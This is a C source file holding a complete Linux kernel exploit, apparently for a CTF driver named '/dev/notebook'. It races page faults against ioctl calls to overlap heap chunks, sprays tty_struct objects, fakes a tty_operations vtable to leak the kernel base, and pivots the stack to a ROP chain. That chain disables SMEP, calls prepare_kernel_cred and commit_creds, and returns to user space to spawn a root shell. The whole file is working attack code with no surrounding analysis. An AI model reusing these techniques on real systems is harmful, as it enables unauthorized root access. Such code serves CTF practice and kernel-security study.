#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#define __USE_GNU
#include <sched.h>
#include <x86intrin.h>
#include <pthread.h>
#include <sys/sysinfo.h>
#include <errno.h>
#define uint64_t u_int64_t

#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144

#define MAP_ADDR 0x1000000

#define TTY_STRUCT_SIZE 0x2e0
#define SPRAY_ALLOC_TIMES 0x100

int spray_fd[0x100];

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
    struct file *filp, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct * tty,
    const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
    struct serial_icounter_struct *icount);
    const struct file_operations *proc_fops;
};

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;

size_t commit_creds_addr=0, prepare_kernel_cred_addr=0;

void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

typedef struct userarg{
    uint64_t idx;
    uint64_t size;
    char* buf;
}Userarg;

typedef struct node{
    uint64_t note;
    uint64_t size;
}Node;

Userarg arg;
Node note[0x10];

uint64_t ko_base = 0;
char buf[0x1000] = {0};

int gift(uint64_t fd,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    memset(buf, 0xcc, 0);
    arg.buf = buf;
    return ioctl(fd,100,&arg);
}

int add(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    return ioctl(fd,0x100,&arg);
}

int del(uint64_t fd,uint64_t idx){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    return ioctl(fd,0x200,&arg);
}

int edit(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    return ioctl(fd,0x300,&arg);
}

size_t find_symbols()
{
    int kallsyms_fd = open("/tmp/moduleaddr", O_RDONLY);

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }
    read(kallsyms_fd,buf,24);
    char hex[20] = {0};
    read(kallsyms_fd,hex,18);
    sscanf(hex, "%llx", &ko_base);
    printf("ko_base addr: %#lx\n", ko_base);
}


size_t vmlinux_base = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_do_tty_hangup = 0xffffffff815af980; 
size_t raw_commit_creds = 0xffffffff810a9b40; 
size_t raw_prepare_kernel_cred = 0xffffffff810a9ef0;
size_t raw_regcache_mark_dirty = 0xffffffff816405b0;
size_t raw_x64_sys_chmod = 0xffffffff81262280;
size_t raw_msleep = 0xffffffff81102360;

size_t raw_pop_rdi = 0xffffffff81007115; //pop rdi; ret;
size_t raw_pop_rdx = 0xffffffff81358842; //pop rdx; ret;
size_t raw_pop_rcx = 0xffffffff812688f3; //pop rcx; ret;

//0xffffffff8250747f : mov rdi, rax ; call rdx
//0xffffffff8147901d : mov rdi, rax ; ja 0xffffffff81479013 ; pop rbp ; ret
//size_t raw_mov_rdi_rax = 0xffffffff8195d1c2; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; 
size_t raw_mov_rdi_rax = 0xffffffff8147901d;

size_t raw_pop_rax = 0xffffffff81540d04;//pop rax; ret;
size_t raw_mov_rdi_rbx = 0xffffffff824f6a4c; //mov rdi, rbx; call rax;
size_t raw_pop_rsi = 0xffffffff8143438e; //pop rsi; ret;
size_t raw_push_rax =  0xffffffff81035b63;//push rax; ret;
size_t raw_pop_rdi_call = 0xffffffff81f0b51c; //pop rdi; call rcx;
size_t raw_xchg_eax_esp  = 0xffffffff8101d247;

//这里注意一定要使用这个gadget去维持栈平衡
//0xffffffff81063710 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
size_t raw_mov_cr4_rdi = 0xffffffff81063710;

size_t base_add(size_t addr){
    return addr - raw_vmlinux_base + vmlinux_base;
}

int main()
{
    find_symbols();
    int fd = open("/dev/notebook", O_RDWR);
    if (fd < 0)
    {
        puts("[*]open notebook error!");
        exit(0);
    }

    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));

    save_state();
    memset(fake_tty_operations, 0, sizeof(struct tty_operations));


START:
    for (int i = 0; i < 0x10; i++)
    {
        del(fd,i);
    }

    //偶数id 用来申请0x2e0的chunk
    for (int i = 0; i < 0x10; i+=2)
    {
        edit(fd, i, 0x2e0, "will");   
    }    
    
    pid_t pid = fork();
    if (!pid)
    {
        sleep(1);
        for (int i = 0; i < 0x10; i+=2)
        {
            edit(fd, i, 0, 0);  //triggle sleep from page fault
            sleep(0.1);
        }
        return 0;
    }
    else
    {
        for (int i = 0;i < 0x10;i+=2){
            gift(fd, buf);
            while (*(uint64_t *)(buf + i * 0x10 + 8))
            {
                gift(fd, buf);
            }
            //将被释放的偶数id的chunk 用奇数id申请回来, 有几率造成chunk overlap
            edit(fd,i+1,0x2e0,"temp");  // i+1 and i --> same used chunk
            edit(fd,i,0x2e0,"temp");    
        }
        
        //存储所有的note
        gift(fd, buf);
        for (int i = 0;i < 0x10;i++){
            note[i].note = *(uint64_t *)(buf + i * 0x10);
            note[i].size = *(uint64_t *)(buf + i*0x10 + 8);
            printf("note[%d] addr: %#lx , size: %d\n", i, *(uint64_t *)(buf + i * 0x10), *(uint64_t *)(buf + i*0x10 + 8));
        }
    }

    //找到两个chunk overlap的id
    int x = -1,y = -1;
    for (int i = 0;i < 0x10;i++){
        for (int j = i + 1;j < 0x10;j++){
            if (note[i].note == note[j].note && note[i].note){
                x = i;
                y = j;
                break;
            }
        }
        if (x != -1 && y != -1)
            break;
    }
    //如果没找到,再来一遍
    if (x == -1 || y == -1)
        goto START;
    else{
        printf("x idx : %d\n",x);
        printf("y idx : %d\n",y);
    }

    //此时x和y指向同一块地址空间,释放y,可以用x 去write这块空间
    del(fd,y);
    
    //多次open保证tty占位
    //因为这里似乎有坑点，查看alloc_tty_struct函数发现，这里的tty大小是0x3a8
    //虽然0x3e8和0x2e0都是0x400的slab,但是单次申请不保证成功
    puts("[+] Spraying buffer with tty_struct");
    for (int i = 0; i < SPRAY_ALLOC_TIMES; i++) {
        spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (spray_fd[i] < 0) {
            perror("open tty");
        }
    }
    
    char tmp[0x2e0] = {0};
    read(fd,tmp,x);
    if (tmp[0] != 0x01 || tmp[1] != 0x54) {
        puts("[-] tty_struct spray failed");
        printf("[-] We should have 0x01 and 0x54, instead we got %02x %02x\n", buf[0], buf[1]);
        puts("[-] Exiting...");
        exit(-1);
    }

    //伪造一个tty vtable，id为y
    char tty_buf[0x200] = {0} ;
    memcpy(tty_buf, fake_tty_operations, sizeof(struct tty_operations));
    edit(fd,y, sizeof(struct tty_operations), "1");
    write(fd, tty_buf, y);
    gift(fd, buf);
    uint64_t fake_vtable = *(uint64_t *)(buf + 0x10*y);

    //读出虚表地址,泄露内核地址 ; 并替换虚表为我们伪造的虚表 
    uint64_t *temp = (uint64_t*)&tmp[24];
    uint64_t old_vtable = *temp;
    *temp = fake_vtable;
    printf("old vtable is %p\n", old_vtable);
    write(fd,tmp,x);
    vmlinux_base   = old_vtable - 0xe8e440;
    printf("kerbel base is %p\n", vmlinux_base);

    
    //在用户空间mmap 一块切栈后的地址空间
    size_t xchg_eax_esp = base_add(raw_xchg_eax_esp);
    size_t base = xchg_eax_esp & 0xfffff000;
    void *map_addr = mmap((void *)base,0x3000,7,MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
    if(base != (uint64_t)map_addr){
        printf("mmap failed!n");
        exit(-1);
    }

    
    //将fake_vtable中的ioctl函数替换为raw_regcache_mark_dirty函数(one gadget --> two gadget)
    fake_tty_operations->ioctl = base_add(raw_regcache_mark_dirty);
    memset(tty_buf,0,0x200);
    memcpy(tty_buf, fake_tty_operations, sizeof(struct tty_operations));
    write(fd, tty_buf, y);
    

    *((uint64_t *)(tmp)+0x20/8+3) = base_add(raw_mov_cr4_rdi);  //lock
    *((uint64_t *)(tmp)+0x28/8+3) = xchg_eax_esp; //unlock
    *((uint64_t *)(tmp)+0x30/8+3) = 0x6f0;  //lock_arg ; rdi
    write(fd,tmp,x);

    size_t pop_rdi = base_add(raw_pop_rdi);
    size_t pop_rdx = base_add(raw_pop_rdx);
    size_t mov_rdi_rax = base_add(raw_mov_rdi_rax);
    size_t pop_rsi = base_add(raw_pop_rsi);
    prepare_kernel_cred_addr = base_add(raw_prepare_kernel_cred);
    commit_creds_addr = base_add(raw_commit_creds);
    size_t xor_edi_edi = base_add(0xffffffff8105c0e0);

    //这里swapgs的时候顺便把KPTI关了
    size_t swapgs_restore_regs_and_return_to_usermode =  base_add(0xffffffff81a0095f);

    size_t rop[0x50];
    char* flag_str = "/flag\x00";
    int i=0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred_addr;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = xor_edi_edi;
    rop[i++] = mov_rdi_rax;  
    rop[i++] = 0;
    rop[i++] = commit_creds_addr;
    rop[i++] = swapgs_restore_regs_and_return_to_usermode; 
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (unsigned long)&win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    memcpy((void *)(xchg_eax_esp&0xffffffff),rop,sizeof(rop));


    //debug
    printf("vtable addr : %p\n", fake_vtable);
    printf("regcache_mark_dirty addr : %p\n", base_add(raw_regcache_mark_dirty));
    char x_buf[10];
    read(0,x_buf, 10);

    puts("[+] Triggering");
    for (int i = 0;i < SPRAY_ALLOC_TIMES; i++) {
        ioctl(spray_fd[i], 0, 0); 
    }
    return 0;
}
